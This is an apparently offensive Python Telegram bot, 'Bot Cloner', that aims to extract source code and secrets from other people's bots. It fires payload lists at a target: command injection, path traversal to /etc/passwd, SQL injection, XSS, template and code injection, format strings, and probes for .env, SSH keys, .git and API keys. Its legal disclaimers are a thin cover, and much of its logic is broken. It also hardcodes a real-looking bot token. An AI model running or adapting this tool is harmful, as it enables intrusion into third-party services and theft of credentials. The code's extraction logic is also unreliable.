#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
TELEGRAM BOT CLONER v4.0 - EXTREME SOURCE CODE EXTRACTOR
Author: BLACKHAT-2026
Compatibility: aiogram 3.9.0+

⚠️ WARNING: This tool attempts to extract source code from Telegram bots.
Success rate is extremely low in 2026 due to security measures.
Only works on poorly secured bots.
"""

import asyncio
import json
import re
import time
import logging
import os
import sys
from datetime import datetime
from pathlib import Path
from typing import Dict, List, Optional, Set
import traceback
import hashlib

from aiogram import Bot, Dispatcher, types, F
from aiogram.filters import Command
from aiogram.types import Message, CallbackQuery, InlineKeyboardMarkup, InlineKeyboardButton, FSInputFile
from aiogram.utils.keyboard import InlineKeyboardBuilder
from aiogram.client.default import DefaultBotProperties
from aiogram.enums import ParseMode

# ============================================================================
# CONFIGURATION
# ============================================================================

VERSION = "4.0.0-CLONER"
BOT_TOKEN = "8653501255:AAGOwfrDxKYa3aHxWAu_FA915SAPtlotqhw"

CLONES_DIR = Path("cloned_bots")
CLONES_DIR.mkdir(exist_ok=True)
LOGS_DIR = Path("logs")
LOGS_DIR.mkdir(exist_ok=True)

# Logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler(LOGS_DIR / f'cloner_{datetime.now().strftime("%Y%m%d")}.log'),
        logging.StreamHandler(sys.stdout)
    ]
)
logger = logging.getLogger(__name__)

# ============================================================================
# BOT SETUP
# ============================================================================

dp = Dispatcher()

# Store found code fragments per user
user_code: Dict[int, Dict] = {}

# ============================================================================
# UI COMPONENTS
# ============================================================================

class UI:
    @staticmethod
    def main_menu() -> InlineKeyboardMarkup:
        builder = InlineKeyboardBuilder()
        builder.row(
            InlineKeyboardButton(text="🎯 Extract Bot Source", callback_data="extract"),
            InlineKeyboardButton(text="📁 View Extracted Code", callback_data="view")
        )
        builder.row(
            InlineKeyboardButton(text="ℹ️ Help", callback_data="help"),
            InlineKeyboardButton(text="⚠️ Legal Warning", callback_data="warning")
        )
        return builder.as_markup()
    
    @staticmethod
    def confirm_warning() -> InlineKeyboardMarkup:
        builder = InlineKeyboardBuilder()
        builder.row(
            InlineKeyboardButton(text="✅ I UNDERSTAND", callback_data="accept"),
            InlineKeyboardButton(text="❌ EXIT", callback_data="exit")
        )
        return builder.as_markup()

# ============================================================================
# CODE EXTRACTOR - ATTACK VECTORS
# ============================================================================

class CodeExtractor:
    def __init__(self, target_bot: str, user_id: int):
        self.target_bot = target_bot
        self.user_id = user_id
        self.fragments = []
        self.extracted_code = {
            "imports": set(),
            "handlers": [],
            "states": [],
            "keyboards": [],
            "database": [],
            "api_keys": [],
            "file_paths": [],
            "error_messages": [],
            "tracebacks": [],
            "full_code": []
        }
        
    async def extract_all(self, bot: Bot):
        """Execute all extraction methods"""
        logger.info(f"🔍 Starting extraction for @{self.target_bot}")
        
        methods = [
            self.force_error_tracebacks,
            self.probe_debug_endpoints,
            self.test_command_injection,
            self.check_common_files,
            self.analyze_error_messages,
            self.test_format_strings,
            self.probe_environment_vars,
            self.check_git_exposure,
            self.analyze_help_commands,
            self.test_unicode_bypass,
            self.probe_web_apps,
            self.check_media_handlers
        ]
        
        for method in methods:
            try:
                result = await method(bot)
                if result:
                    logger.info(f"✅ Method {method.__name__} found data")
                await asyncio.sleep(1.5)  # Avoid rate limiting
            except Exception as e:
                logger.error(f"Method {method.__name__} failed: {e}")
        
        return self._generate_code()
    
    async def force_error_tracebacks(self, bot: Bot):
        """Force Python tracebacks that reveal code"""
        payloads = [
            ("/start" + "A" * 50000, "buffer_overflow"),
            ("/help" + "\x00" * 1000, "null_byte"),
            ("/settings" + "{}" * 500, "json_parse"),
            ("A" * 100000, "long_message"),
            ("/eval " + "__import__('os').system('ls')", "code_injection"),
            ("/exec " + "print(open(__file__).read())", "file_read"),
            ("{{7*7}}", "template_injection"),
            ("${7*7}", "shell_injection"),
            ("../../../etc/passwd", "path_traversal"),
            ("..%2f..%2f..%2fetc%2fpasswd", "url_traversal"),
            ("'; DROP TABLE users; --", "sql_injection"),
            ("<script>alert(1)</script>", "xss"),
            ("{{ config.items() }}", "flask_config"),
            ("{{ self.__class__.__mro__ }}", "python_introspection"),
        ]
        
        for payload, ptype in payloads:
            try:
                await bot.send_message(
                    chat_id=f"@{self.target_bot}",
                    text=payload
                )
                await asyncio.sleep(0.3)
            except Exception as e:
                error = str(e)
                if any(x in error.lower() for x in ["traceback", "file", "line", "error", "exception"]):
                    self._save_traceback(error, ptype)
    
    async def probe_debug_endpoints(self, bot: Bot):
        """Probe for debug commands and endpoints"""
        debug_commands = [
            "/debug", "/source", "/code", "/src", "/git", "/github",
            "/repo", "/repository", "/download", "/export", "/backup",
            "/.env", "/config", "/settings", "/admin", "/root",
            "/status", "/health", "/metrics", "/stats", "/info",
            "/version", "/sysinfo", "/environment", "/vars",
            "/phpinfo", "/info.php", "/test", "/dev", "/staging",
            "/internal", "/private", "/secret", "/hidden",
            "/dump", "/var_dump", "/print_r", "/reveal",
            "/stacktrace", "/backtrace", "/trace",
            "/getSource", "/getCode", "/view-source",
        ]
        
        for cmd in debug_commands:
            try:
                await bot.send_message(
                    chat_id=f"@{self.target_bot}",
                    text=cmd
                )
                await asyncio.sleep(0.2)
            except Exception as e:
                if "403" not in str(e):  # Ignore forbidden
                    self._save_fragment("debug_endpoint", f"{cmd}: {e}")
    
    async def test_command_injection(self, bot: Bot):
        """Test for command injection vulnerabilities"""
        injections = [
            ("/start; ls -la", "cmd_injection"),
            ("/help | cat /etc/passwd", "pipe_injection"),
            ("/settings && echo vulnerable", "and_injection"),
            ("/info || dir", "or_injection"),
            ("/start `ls`", "backtick_injection"),
            ("/help $(cat /etc/passwd)", "subshell_injection"),
        ]
        
        for payload, ptype in injections:
            try:
                await bot.send_message(
                    chat_id=f"@{self.target_bot}",
                    text=payload
                )
                await asyncio.sleep(0.5)
            except Exception as e:
                if "vulnerable" in str(e).lower() or "permission" in str(e).lower():
                    self._save_fragment("injection", f"{ptype}: {e}")
    
    async def check_common_files(self, bot: Bot):
        """Check for exposed common files"""
        files = [
            "/.git/config",
            "/.env",
            "/requirements.txt",
            "/package.json",
            "/composer.json",
            "/config.py",
            "/settings.py",
            "/database.py",
            "/models.py",
            "/handlers.py",
            "/main.py",
            "/bot.py",
            "/index.py",
            "/app.py",
            "/wsgi.py",
            "/manage.py",
            "/Dockerfile",
            "/docker-compose.yml",
            "/.htaccess",
            "/nginx.conf",
            "/.bash_history",
            "/.ssh/id_rsa",
            "/id_rsa",
        ]
        
        for file_path in files:
            try:
                # Try to access as webhook or command
                await bot.send_message(
                    chat_id=f"@{self.target_bot}",
                    text=f"/start {file_path}"
                )
                await asyncio.sleep(0.2)
            except Exception as e:
                if "file" in str(e).lower() or "found" in str(e).lower():
                    self._save_fragment("file_path", file_path)
    
    async def analyze_error_messages(self, bot: Bot):
        """Analyze error messages for code snippets"""
        error_triggers = [
            ("/start {}" * 100, "format_error"),
            ("/help %s %s %s" * 50, "string_format"),
            ("/settings " + "%" * 1000, "percent_error"),
            ("/info " + "{" * 1000, "brace_error"),
            ("/stats " + "(" * 1000, "parenthesis_error"),
            ("/data " + "[" * 1000, "bracket_error"),
        ]
        
        for payload, etype in error_triggers:
            try:
                await bot.send_message(
                    chat_id=f"@{self.target_bot}",
                    text=payload
                )
                await asyncio.sleep(0.3)
            except Exception as e:
                error = str(e)
                # Extract potential file paths and line numbers
                paths = re.findall(r'File "([^"]+)"', error)
                lines = re.findall(r'line (\d+)', error)
                code = re.findall(r'in (.+)\n', error)
                
                if paths or lines or code:
                    self._save_fragment("error_analysis", {
                        "type": etype,
                        "paths": paths,
                        "lines": lines,
                        "code": code,
                        "error": error[:500]
                    })
    
    async def test_format_strings(self, bot: Bot):
        """Test format string vulnerabilities"""
        format_strings = [
            "%s" * 100,
            "%d" * 100,
            "%x" * 100,
            "%p" * 100,
            "%n" * 10,
            "%08x" * 50,
            "%s%s%s%s%s%s%s%s%s%s",
        ]
        
        for fmt in format_strings:
            try:
                await bot.send_message(
                    chat_id=f"@{self.target_bot}",
                    text=f"/start {fmt}"
                )
                await asyncio.sleep(0.2)
            except Exception as e:
                if "memory" in str(e).lower() or "stack" in str(e).lower():
                    self._save_fragment("format_string", fmt)
    
    async def probe_environment_vars(self, bot: Bot):
        """Probe for environment variable leaks"""
        env_vars = [
            "process.env",
            "os.environ",
            "$PATH",
            "$HOME",
            "$PWD",
            "DATABASE_URL",
            "REDIS_URL",
            "MONGODB_URI",
            "AWS_ACCESS_KEY",
            "SECRET_KEY",
            "API_KEY",
            "BOT_TOKEN",
        ]
        
        for var in env_vars:
            try:
                await bot.send_message(
                    chat_id=f"@{self.target_bot}",
                    text=f"/start {var}"
                )
                await asyncio.sleep(0.2)
            except Exception as e:
                if var.lower() in str(e).lower():
                    self._save_fragment("env_var", var)
    
    async def check_git_exposure(self, bot: Bot):
        """Check for git repository exposure"""
        git_paths = [
            "/.git/HEAD",
            "/.git/config",
            "/.git/index",
            "/.git/logs/HEAD",
            "/.git/refs/heads/master",
        ]
        
        for path in git_paths:
            try:
                await bot.send_message(
                    chat_id=f"@{self.target_bot}",
                    text=f"/start {path}"
                )
                await asyncio.sleep(0.2)
            except Exception as e:
                if "ref:" in str(e) or "master" in str(e):
                    self._save_fragment("git_exposure", path)
    
    async def analyze_help_commands(self, bot: Bot):
        """Analyze help commands for command list"""
        help_commands = [
            "/help",
            "/start",
            "/commands",
            "/menu",
            "/options",
            "/list",
            "/cmds",
            "/hilfe",
            "/info",
        ]
        
        for cmd in help_commands:
            try:
                msg = await bot.send_message(
                    chat_id=f"@{self.target_bot}",
                    text=cmd
                )
                # Can't capture response directly, will be handled by message handler
                await asyncio.sleep(1)
            except Exception as e:
                pass
    
    async def test_unicode_bypass(self, bot: Bot):
        """Test unicode normalization bypasses"""
        unicode_payloads = [
            ("/start\u202Egpj", "rtl_override"),
            ("/start\uFF2F\uFF35\uFF34", "fullwidth"),
            ("/sτart", "homoglyph"),
            ("/ѕtart", "cyrillic_homoglyph"),
            ("/ｓｔａｒｔ", "fullwidth_ascii"),
        ]
        
        for payload, ptype in unicode_payloads:
            try:
                await bot.send_message(
                    chat_id=f"@{self.target_bot}",
                    text=payload
                )
                await asyncio.sleep(0.3)
            except Exception as e:
                self._save_fragment("unicode_bypass", f"{ptype}: {e}")
    
    async def probe_web_apps(self, bot: Bot):
        """Probe web app endpoints"""
        web_apps = [
            "/webapp",
            "/app",
            "/web",
            "/api",
            "/graphql",
            "/rest",
            "/v1",
            "/v2",
            "/callback",
            "/webhook",
        ]
        
        for endpoint in web_apps:
            try:
                kb = InlineKeyboardBuilder()
                kb.button(text="Test", web_app=types.WebAppInfo(url=f"https://t.me/{self.target_bot}{endpoint}"))
                
                await bot.send_message(
                    chat_id=f"@{self.target_bot}",
                    text=f"Testing webapp: {endpoint}",
                    reply_markup=kb.as_markup()
                )
                await asyncio.sleep(0.5)
            except Exception as e:
                self._save_fragment("webapp", f"{endpoint}: {e}")
    
    async def check_media_handlers(self, bot: Bot):
        """Check media handlers for leaks"""
        try:
            # Send a test image
            await bot.send_photo(
                chat_id=f"@{self.target_bot}",
                photo="https://via.placeholder.com/1",
                caption="../../../../etc/passwd"
            )
        except Exception as e:
            if "file" in str(e).lower():
                self._save_fragment("media_handler", str(e))
    
    def _save_traceback(self, error: str, source: str):
        """Save traceback and extract code"""
        self.extracted_code["tracebacks"].append({
            "source": source,
            "error": error[:1000]
        })
        
        # Extract file paths
        paths = re.findall(r'File "([^"]+)"', error)
        for path in paths:
            if path not in self.extracted_code["file_paths"]:
                self.extracted_code["file_paths"].append(path)
                self._save_fragment("file_path", path)
        
        # Extract line numbers
        lines = re.findall(r'line (\d+)', error)
        for line in lines:
            self._save_fragment("line_number", line)
        
        # Extract function names
        functions = re.findall(r'in ([^(]+)', error)
        for func in functions:
            if func.strip() and func not in ["<module>"]:
                self._save_fragment("function", func.strip())
        
        # Extract code snippets
        code_blocks = re.findall(r'(.+?)\n', error)
        for code in code_blocks:
            if any(x in code for x in ["def ", "class ", "import ", "from ", "@"]):
                self.extracted_code["full_code"].append(code.strip())
    
    def _save_fragment(self, frag_type: str, content: any):
        """Save a code fragment"""
        fragment = {
            "type": frag_type,
            "content": content,
            "timestamp": datetime.now().isoformat()
        }
        
        if fragment not in self.fragments:
            self.fragments.append(fragment)
            
            if frag_type == "imports" and isinstance(content, str):
                self.extracted_code["imports"].add(content)
            elif frag_type == "handlers":
                self.extracted_code["handlers"].append(content)
            elif frag_type == "states":
                self.extracted_code["states"].append(content)
            elif frag_type == "api_keys":
                self.extracted_code["api_keys"].append(content)
    
    def _generate_code(self) -> str:
        """Generate reconstructed Python code"""
        code = []
        
        # Header
        code.append("#!/usr/bin/env python3")
        code.append("# -*- coding: utf-8 -*-")
        code.append('"""')
        code.append(f"AUTO-GENERATED BOT CODE")
        code.append(f"Extracted from: @{self.target_bot}")
        code.append(f"Extraction date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        code.append('"""')
        code.append("")
        
        # Imports
        if self.extracted_code["imports"]:
            code.append("# Extracted imports")
            for imp in sorted(self.extracted_code["imports"]):
                code.append(imp)
            code.append("")
        
        # File paths found
        if self.extracted_code["file_paths"]:
            code.append("# Potential file paths")
            for path in self.extracted_code["file_paths"][:10]:
                code.append(f"# {path}")
            code.append("")
        
        # Error messages (often contain code)
        if self.extracted_code["error_messages"]:
            code.append("# Error messages (may contain code)")
            for error in self.extracted_code["error_messages"][:5]:
                code.append(f"# {error[:200]}")
            code.append("")
        
        # Tracebacks (most valuable)
        if self.extracted_code["tracebacks"]:
            code.append("# ========================================")
            code.append("# EXTRACTED TRACEBACKS (CODE SNIPPETS)")
            code.append("# ========================================")
            code.append("")
            
            for i, tb in enumerate(self.extracted_code["tracebacks"][:3]):
                code.append(f"# Traceback {i+1} - Source: {tb['source']}")
                code.append("# " + "-" * 50)
                
                # Extract code lines from traceback
                lines = tb['error'].split('\n')
                for line in lines:
                    if any(x in line for x in ["File", "line", "def ", "class ", "return", "await", "async"]):
                        code.append(f"# {line.strip()}")
                code.append("")
        
        # Full code snippets
        if self.extracted_code["full_code"]:
            code.append("# ========================================")
            code.append("# CODE SNIPPETS")
            code.append("# ========================================")
            code.append("")
            
            for snippet in self.extracted_code["full_code"][:20]:
                if len(snippet) > 10:
                    code.append(snippet)
            code.append("")
        
        # Handlers found
        if self.extracted_code["handlers"]:
            code.append("# ========================================")
            code.append("# DETECTED HANDLERS")
            code.append("# ========================================")
            code.append("")
            
            for handler in self.extracted_code["handlers"][:10]:
                code.append(f"# {handler}")
        
        # Template for reconstructed bot
        code.append("")
        code.append("# ========================================")
        code.append("# RECONSTRUCTED BOT TEMPLATE")
        code.append("# ========================================")
        code.append("")
        code.append("from aiogram import Bot, Dispatcher, types")
        code.append("from aiogram.filters import Command")
        code.append("from aiogram.types import Message")
        code.append("import asyncio")
        code.append("import logging")
        code.append("")
        code.append("# Configure logging")
        code.append('logging.basicConfig(level=logging.INFO)')
        code.append("")
        code.append("# Initialize bot")
        code.append('BOT_TOKEN = "YOUR_BOT_TOKEN_HERE"')
        code.append("bot = Bot(token=BOT_TOKEN)")
        code.append("dp = Dispatcher()")
        code.append("")
        code.append("# ========================================")
        code.append("# EXTRACTED FUNCTIONALITY")
        code.append("# ========================================")
        code.append("")
        
        # Add placeholder for extracted functionality
        code.append("@dp.message(Command('start'))")
        code.append("async def cmd_start(message: Message):")
        code.append('    """Reconstructed start command"""')
        code.append('    await message.answer("Bot cloned from @" + "'" + self.target_bot + "'" + '")')
        code.append("")
        
        code.append("# ========================================")
        code.append("# MAIN FUNCTION")
        code.append("# ========================================")
        code.append("")
        code.append("async def main():")
        code.append("    await dp.start_polling(bot)")
        code.append("")
        code.append('if __name__ == "__main__":')
        code.append("    asyncio.run(main())")
        
        return "\n".join(code)

# ============================================================================
# HANDLERS
# ============================================================================

@dp.message(Command("start"))
async def cmd_start(message: Message):
    """Start command"""
    user_id = message.from_user.id
    logger.info(f"👤 User {user_id} started the bot")
    
    # Check if user has accepted warning
    if user_id not in user_code or not user_code.get(user_id, {}).get("accepted", False):
        warning = (
            "⚠️ <b>LEGAL WARNING</b> ⚠️\n\n"
            "This tool attempts to <b>extract source code</b> from Telegram bots.\n\n"
            "<b>By using this tool you confirm:</b>\n"
            "✅ You have EXPLICIT PERMISSION from the bot owner\n"
            "✅ You are ONLY testing your OWN bots\n"
            "✅ You accept FULL LEGAL RESPONSIBILITY\n\n"
            "<i>Success rate is extremely low in 2026.</i>"
        )
        await message.answer(warning, parse_mode="HTML", reply_markup=UI.confirm_warning())
    else:
        await show_menu(message)

async def show_menu(message: Message):
    """Show main menu"""
    text = (
        f"🤖 <b>Bot Cloner v{VERSION}</b>\n\n"
        f"<b>How it works:</b>\n"
        f"1️⃣ Send the bot username (e.g., @target_bot)\n"
        f"2️⃣ I'll try to extract its source code\n"
        f"3️⃣ You'll receive the reconstructed Python code\n\n"
        f"<b>⚠️ Note:</b> This only works on poorly secured bots!"
    )
    await message.answer(text, parse_mode="HTML", reply_markup=UI.main_menu())

@dp.callback_query(F.data == "accept")
async def accept_warning(callback: CallbackQuery):
    """Accept warning"""
    user_id = callback.from_user.id
    if user_id not in user_code:
        user_code[user_id] = {}
    user_code[user_id]["accepted"] = True
    
    await callback.message.delete()
    await show_menu(callback.message)
    await callback.answer()

@dp.callback_query(F.data == "exit")
async def exit_bot(callback: CallbackQuery):
    """Exit bot"""
    await callback.message.edit_text("👋 Goodbye! Use /start to restart.")
    await callback.answer()

@dp.callback_query(F.data == "help")
async def show_help(callback: CallbackQuery):
    """Show help"""
    text = (
        "📚 <b>Help</b>\n\n"
        "<b>How to extract code:</b>\n"
        "1. Click 'Extract Bot Source'\n"
        "2. Send the bot username (e.g., @example_bot)\n"
        "3. Wait 30-60 seconds while I probe for leaks\n"
        "4. Receive reconstructed Python code\n\n"
        "<b>Extraction methods:</b>\n"
        "• Force error tracebacks\n"
        "• Probe debug endpoints\n"
        "• Test command injection\n"
        "• Check for exposed files\n"
        "• Analyze error messages\n"
        "• Test format strings\n"
        "• Check git exposure\n"
        "• And many more..."
    )
    
    builder = InlineKeyboardBuilder()
    builder.row(InlineKeyboardButton(text="🔙 Back", callback_data="back"))
    
    await callback.message.edit_text(text, parse_mode="HTML", reply_markup=builder.as_markup())
    await callback.answer()

@dp.callback_query(F.data == "warning")
async def show_warning(callback: CallbackQuery):
    """Show warning again"""
    warning = (
        "⚠️ <b>LEGAL WARNING</b> ⚠️\n\n"
        "This tool is for <b>EDUCATIONAL PURPOSES</b> and <b>AUTHORIZED TESTING ONLY</b>.\n\n"
        "<b>Using this tool on bots you don't own is ILLEGAL!</b>\n\n"
        "• You can face criminal charges\n"
        "• Your Telegram account will be banned\n"
        "• You may be prosecuted\n\n"
        "<i>Only test your OWN bots!</i>"
    )
    
    builder = InlineKeyboardBuilder()
    builder.row(InlineKeyboardButton(text="🔙 Back", callback_data="back"))
    
    await callback.message.edit_text(warning, parse_mode="HTML", reply_markup=builder.as_markup())
    await callback.answer()

@dp.callback_query(F.data == "back")
async def go_back(callback: CallbackQuery):
    """Go back to main menu"""
    await callback.message.delete()
    await show_menu(callback.message)
    await callback.answer()

@dp.callback_query(F.data == "extract")
async def extract_prompt(callback: CallbackQuery):
    """Prompt for bot username"""
    text = (
        "🎯 <b>Extract Bot Source</b>\n\n"
        "Send me the bot's username:\n\n"
        "Example: <code>@target_bot</code> or just <code>target_bot</code>\n\n"
        "<i>I'll try to extract its source code...</i>"
    )
    
    builder = InlineKeyboardBuilder()
    builder.row(InlineKeyboardButton(text="🔙 Cancel", callback_data="back"))
    
    await callback.message.edit_text(text, parse_mode="HTML", reply_markup=builder.as_markup())
    await callback.answer()

@dp.message()
async def handle_username(message: Message):
    """Handle bot username input"""
    user_id = message.from_user.id
    username = message.text.strip().replace('@', '')
    
    logger.info(f"📝 User {user_id} requested extraction for @{username}")
    
    # Send initial status
    status_msg = await message.answer(
        f"🔍 <b>Extracting source from @{username}...</b>\n\n"
        f"This may take 30-60 seconds.\n"
        f"I'll try multiple attack vectors.",
        parse_mode="HTML"
    )
    
    # Create extractor
    extractor = CodeExtractor(username, user_id)
    
    try:
        # Run extraction
        await status_msg.edit_text(
            f"🔍 <b>Extracting...</b>\n\n"
            f"Target: @{username}\n"
            f"Status: Probing endpoints...",
            parse_mode="HTML"
        )
        
        # Execute all extraction methods
        reconstructed_code = await extractor.extract_all(message.bot)
        
        # Save to file
        filename = f"cloned_{username}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.py"
        filepath = CLONES_DIR / filename
        
        with open(filepath, 'w', encoding='utf-8') as f:
            f.write(reconstructed_code)
        
        # Count findings
        findings = len(extractor.fragments)
        tracebacks = len(extractor.extracted_code["tracebacks"])
        paths = len(extractor.extracted_code["file_paths"])
        
        # Send result
        if findings > 0 or tracebacks > 0:
            result_text = (
                f"✅ <b>Extraction Complete!</b>\n\n"
                f"Target: @{username}\n"
                f"Fragments found: {findings}\n"
                f"Tracebacks: {tracebacks}\n"
                f"File paths: {paths}\n\n"
                f"Sending reconstructed code..."
            )
            await status_msg.edit_text(result_text, parse_mode="HTML")
            
            # Send the file
            await message.answer_document(
                FSInputFile(filepath),
                caption=f"🤖 Reconstructed code for @{username}\nFragments: {findings} | Tracebacks: {tracebacks}"
            )
        else:
            await status_msg.edit_text(
                f"❌ <b>No code extracted from @{username}</b>\n\n"
                f"This bot appears to be secure.\n"
                f"Try another bot or check the logs.",
                parse_mode="HTML",
                reply_markup=UI.main_menu()
            )
        
    except Exception as e:
        logger.error(f"❌ Extraction error: {e}")
        logger.error(traceback.format_exc())
        await status_msg.edit_text(
            f"❌ <b>Error during extraction:</b>\n<code>{str(e)[:200]}</code>",
            parse_mode="HTML",
            reply_markup=UI.main_menu()
        )

@dp.callback_query(F.data == "view")
async def view_extracted(callback: CallbackQuery):
    """View previously extracted code"""
    user_id = callback.from_user.id
    
    # List files in clones directory
    files = list(CLONES_DIR.glob("*.py"))
    files.sort(key=lambda x: x.stat().st_mtime, reverse=True)
    
    if not files:
        await callback.message.edit_text(
            "📁 <b>No extracted code found.</b>\n\n"
            "Extract a bot first!",
            parse_mode="HTML",
            reply_markup=UI.main_menu()
        )
        await callback.answer()
        return
    
    # Show last 5 files
    text = "📁 <b>Your Extracted Bots</b>\n\n"
    for i, file in enumerate(files[:5]):
        size = file.stat().st_size
        modified = datetime.fromtimestamp(file.stat().st_mtime).strftime('%Y-%m-%d %H:%M')
        text += f"{i+1}. <code>{file.name}</code>\n   Size: {size} bytes | {modified}\n\n"
    
    builder = InlineKeyboardBuilder()
    builder.row(InlineKeyboardButton(text="🔙 Back", callback_data="back"))
    
    await callback.message.edit_text(text, parse_mode="HTML", reply_markup=builder.as_markup())
    await callback.answer()

# ============================================================================
# MAIN
# ============================================================================

async def main():
    """Main function"""
    logger.info(f"🚀 Starting Bot Cloner v{VERSION}")
    logger.info(f"📁 Clones directory: {CLONES_DIR.absolute()}")
    
    bot = Bot(
        token=BOT_TOKEN,
        default=DefaultBotProperties(parse_mode=ParseMode.HTML)
    )
    
    logger.info("✅ Bot is running! Send /start")
    
    try:
        await dp.start_polling(bot)
    except Exception as e:
        logger.error(f"❌ Fatal error: {e}")
    finally:
        logger.info("🛑 Bot stopped")

if __name__ == "__main__":
    asyncio.run(main())
